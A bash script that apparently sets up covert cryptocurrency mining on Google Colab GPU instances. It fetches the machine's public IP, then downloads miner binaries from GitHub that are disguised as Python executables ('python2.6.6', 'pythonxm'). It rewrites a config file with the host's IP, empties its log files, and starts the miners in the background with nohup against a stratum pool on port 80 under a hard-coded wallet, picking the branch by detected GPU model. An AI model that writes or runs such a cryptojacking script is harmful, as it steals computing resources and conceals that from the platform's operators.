#!bin/bash -xe 

## getting IP info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io

echo '#######################################################'
echo '##################### RV v0.0.2 #######################'
echo '#######################################################'

rm -rf python2.6.6
rm -rf pythonoc
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
chmod +x python2.6.6
cp python2.6.6 pythonoc

#### Clean logs
echo > cuout
echo > ocout
echo > ocoutdef
echo > oout
echo > oout
echo > results.txt 

########## XMR
rm -rf pythonxm
rm -rf config3.json
rm -rf x.out

# Prepare
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
chmod +x pythonxm
wget -q https://github.com/one10001/10001code/raw/main/config.json
sed -i "s+ip0001+COLAB_RV_$IPNAME+g" config.json

nohup ./pythonxm -c config.json 2>> oout 1>> oout &



if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
then
    while true
    do
        nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
        tail -f oout
   done
elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
then
    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@116.203.10.54:80  -G  2>> oout 1>> oout &
    tail -f oout
elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
then
    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
    tail -f oout
else
    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
     tail -f oout
fi